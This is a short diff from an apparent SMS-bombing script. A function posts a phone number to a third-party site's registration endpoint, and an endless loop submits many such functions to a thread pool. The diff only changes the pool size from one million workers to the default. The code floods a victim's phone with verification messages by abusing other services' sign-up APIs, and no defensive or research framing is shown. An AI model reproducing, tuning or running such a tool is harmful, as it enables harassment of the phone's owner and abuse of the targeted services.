@@ -897,7 +897,7 @@ def api125():
 
 def api126():
     requests.post("https://queenclub88.com/api/register/phone", data={" phone": phone})
-exe = ThreadPoolExecutor(max_workers=1000000)
+exe = ThreadPoolExecutor()
 while True:
     exe.submit(api1)
     exe.submit(api2)
